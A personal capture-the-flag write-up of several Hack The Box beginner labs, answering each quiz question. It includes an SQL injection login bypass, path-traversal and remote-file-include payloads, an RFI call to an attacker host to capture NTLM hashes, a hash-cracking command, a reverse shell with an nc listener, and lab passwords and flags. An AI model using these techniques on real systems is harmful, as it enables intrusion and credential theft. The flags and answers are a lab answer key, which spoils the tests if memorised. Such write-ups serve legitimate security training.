![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/8ccfeabd-6654-4e8a-89f4-c3393769a709)

1. What does the acronym SQL stand for?
We need to check it in google, i don't rember the acronym SQL, i found this 

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/d11dea70-6748-4e21-b8a4-8da8298df13f)

2. What is one of the most common type of SQL vulnerabilities? 
We can google it, but i rember this, this is a SQLi, SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database

4. What is the 2021 OWASP Top 10 classification for this vulnerability? 
Let's go search something about it, i found this on OWASP top 10, we got the answer for this question:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/7db194aa-0892-4d38-9ff1-47e4ad39c42e)

5. What does Nmap report as the service and version that are running on port 80 of the target? 
We need to use nmap, to check what's running on port 80, to know what kind of service version i recommend to use switch for nmap --script=http-enum, with this switch, we can get what we want :P But in this situation this doesn't wanna work, i use -sCV, and i got everything:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/3359508c-2470-4a82-aaf6-6564be4cd1bd)

6. What is the standard port used for the HTTPS protocol?
We need to google it, ask google what hi think about it.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/d5dd4ee0-9215-48a7-bb6c-1079ecabf73b)

7. What is a folder called in web-application terminology? 
just directory

8. What is the HTTP response code is given for 'Not Found' errors? 
The 404 Not Found Error is an HTTP response status code, which indicates that the requested resource could not be found. Like most HTTP response codes, the cause of a 404 Not Found Error can be challenging to track down and resolve

9. Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? 
We need to check it by command: gobuster dir, here's the answer below.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/fbd677e1-c637-4e68-a1ca-2bfe8b2991ed)

10.What single character can be used to comment out the rest of a line in MySQL? 
This work like in HTML, to comment the rest of line we need to use #

11.If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? 
We need to login as admin' #, and we got this

12. Submit root flag 

here is the flag.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/ece7eedb-5eb7-4d3b-9662-2db17108b6eb)


![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/7acfd89b-cce5-40b9-bf60-1b394b11b0f3)

1. During our scan, which port do we find serving MySQL? 
Let's turn on the nmap, and check what's running on the server.
And we got the answer, mysql running on port 3306

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/46e57ba3-61c3-41da-8f91-c01df5482c40)

2. What community-developed MySQL version is the target running? 
We can know this from previouse scan, the version MySQL is MariaDB

3. When using the MySQL command line client, what switch do we need to use in order to specify a login username? 
We need to check it, by command mariandb --help

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/08068c7b-310e-4145-8f72-679c683aabf0)

4.Which username allows us to log into this MariaDB instance without providing a password? 
The root evil of all

5.In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? 
The answer is: *

6. In SQL, what symbol do we need to end each query with? 
The answer is: ;

7. There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? 
FIrst we need to log in into Database, step is turn on ur terminal and write this: mysql -h <IP> -u root
Then we can see, we are login, the next step is show databases; we can see there 4 database. The answer is htb

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/b88ad9c4-b3ae-4803-ade6-9ba3f9a0d337)

8. Submit root flag 

Here's step by step how i got the flag.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/22bd081d-caa7-4ccb-af05-a92abacab3de)


Let's go to the next lab

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/55f1d64f-788f-44ae-9fdc-ebf4dc4c01fb)

1. What Nmap scanning switch employs the use of default scripts during a scan? 
We need to write nmap -h, to find this switch, the switch is -sC

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/1836712c-4652-4dc4-850e-29c0f7c820d2)

2. What service version is found to be running on port 21? 
Now we need to turn on the nmap, and check this out, here's is the result

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/82e17b65-b63d-41dc-a0ef-a0d53a737682)

3.What FTP code is returned to us for the "Anonymous FTP login allowed" message? 
We need to log in as Anonymouse to check it, by command ftp <ip> then username: Anonymouse, password: "press enter"
There we can see 230 login successful

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/455d9ba7-ccd8-47bc-a37c-0716a27c84bc)

4. After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? 
anonymous, this question is dump, how can check the status code, without log in into the FTP

5. After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? 
Can can by by command help

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/32b05eb2-7fe6-4254-a18f-ccf752edbee7)

6. What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? 
First we need to download by command: get allowed.userlist and also i recommend download the secend file allowed.userlist.passwd, then list this file.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/630e2de2-7f3a-4bd4-95b6-09cd46e80717)

7.What version of Apache HTTP Server is running on the target host? 
We can take this from the scan what we do in secend task. Apache httpd 2.4.41

8.What switch can we use with Gobuster to specify we are looking for specific filetypes? 
use gobuster dir -h, there u can find answer for the question.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/6338b986-12bd-4785-a142-54b01b8bdae4)

9. Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? 

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/4ec7df6e-155c-4ae5-9ba1-e5042b2da26b)

10. Submit root flag
Now we need to go on login.php and i hope you rember, i download from ftp password, let's take a look 

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/19cc65d3-6dd3-44fb-8263-2226a5839437)

That how can see, we got 4 password now we need to test it, and log in as admin, the last password is working: rKXM59ESxesUFHAd
And we got the flag.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/764a8606-0108-4857-87e2-d75578fe0759)


The next lab is:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/38f94aa6-3af0-4f09-b170-11acae324314)

1.When visiting the web service using the IP address, what is the domain that we are being redirected to? 
First what we need to do is visit the website, there we can see this:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/e15f4d8d-2c3a-43bc-901d-5bba4e063738)

2. Which scripting language is being used on the server to generate webpages? 
If you insert in /etc/hosts this domain, we need to check this with some tool, i recommend use wapalyzer, we can see the language used the server

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/1c58282d-1726-4147-bd33-598bc10527bc)

3. What is the name of the URL parameter which is used to load different language versions of the webpage? 
In the right corner we see button to change language, if we change from EN to DE we need to look on URL, there we can see some changes
The answer is page

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/2669cd3e-2be5-4c7d-94a4-499a00e8cb42)

4.Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 

The answer is ../../../../../../../../windows/system32/drivers/etc/hosts, because LFI work's like changing the directory in terminal.

5. Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 

The answer is //10.10.14.6/somefile
(RFI), an attacker can cause the web application to include a remote file

6. What does NTLM stand for?
I check this acronym and i found this:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/e6695819-db34-4a47-bcc7-e1def245279d)

7. Which flag do we use in the Responder utility to specify the network interface? 
I wrote in terminal responder -h and there i found this what i needed

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/dee62ab8-f893-4677-9c78-8054a9571b91)

8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 
This tool is john the ripper. John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems

9. What is the password for the administrator user? 
First what we need to do is turn on the responder: responder -I tun0
Then go to the website and do RFI, do http://unika.htb/index.php?page=//<IP>/nothing, after this you can see in ur responder username and hash of administrator password:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/5c8a7f63-1ae4-43a7-9cc6-19791223127c)

Now save this hash, and use john: john -w=/usr/share/wordlist/rockyou hash.txt
The password is badminton

10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 
We need to scan the machine and check what's running on the server

i found something intresting check this out

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/5ae7ef52-785e-4118-96f0-c0fdb12fc0eb)

11. Submit root flag 
We need to search something about this port i always reccomend check on the hacktricks, on this website is everything
I found how to login into this port.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/074c8ffe-12a9-4fa3-a613-b0b99625cc56)

But we need to change from -H to -p beacause we know the password, then we have access, in folder mike we can find flag.txt
ea81b7afddd03efaa0945333ed147fac 

The next lab is:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/c19dbc5d-fa08-4c29-a333-8b2dcf7b189a)

1. How many TCP ports are open? 
First we need to do a scan, to know what's running on the server, i found only two standard port, one is SSH and the secend is HTTP

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/3862344a-74be-4747-af16-e1405e7864a3)

2.What is the domain of the email address provided in the "Contact" section of the website? 
First we need to add in /etc/hosts the domain s3.thetoppers.htb and thetoppers.htb, then let's visit the website and do some recon, what's going on the website. I found quickly the e-mail, here it is:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/79fdfec4-26e9-4b13-9f64-233c0293c40a)

3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 
That's how i show you in the previouse task how to add the domain, we need to run /etc/hosts as root here is the command: sudo nano /etc/hosts, then add the subdomain.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/d4ac3592-dbd8-4bd1-b816-e896ac3e6f03)

4. Which sub-domain is discovered during further enumeration? 
I know 3 tools, with this tool you can discover subdomain, sublist3r,ffuf and gobuster dns, i will show with ffuf and gobuster
This how you can do with ffuf: ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://thetoppers.htb/ -H "Host: FUZZ.thetoppers.htb"
This how you can do with gobuster: gobuster dns -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -d thetoppers.htb

and i found this: ![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/c2b96589-d442-4d40-b948-473e716c7251)

5. Which service is running on the discovered sub-domain? 
We to google it, try to find something about s3, then you can find this, and also this is a answer for question:

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/60938837-bcfc-44bc-9a5e-bd1bf4f114d4)

6.Which command line utility can be used to interact with the service running on the discovered sub-domain? 
Also this we need to google, beacause i have no idea what kind of tools can help to connect into s3 amazon

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/99bf36b4-c047-41ce-baa5-0f8b0de8f48e)

also here you can find everything about s3, docs amazon:https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html

7. Which command is used to set up the AWS CLI installation? 
In the amazon docs you can find everything, here is the command is used to set up the AWS CLI

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/0041de23-51c0-4da1-affb-ec0d2f99e313)

8. What is the command used by the above utility to list all of the S3 buckets?
Also again in docs i found the answer for the question :P, i realy recommend everyone read the docs, there you can find everything.

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/71533be9-f639-4a2b-a10b-fff4dd7267ab)

9. This server is configured to run files written in what web scripting language? 
The server is running on PHP

10. Submit root flag 
First what i recommend is do some recon on aws.
With this command u can list all file on the aws: aws s3 ls --endpoint=http://s3.thetoppers.htb/ s3://thetoppers.htb
But i can't find anything intrestting on aws

![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/dab8d7ae-e5ac-44ab-8301-142e51a78986)

you can do RCE by firt you need to cp the reverse-shell and change the ip, than run nc -lvnp 1234
Then use this command to copy this reverse-shell into s3

And there you can find ur flag: a980d99281a28d638ac68b9bf9453c2b

We got this :D
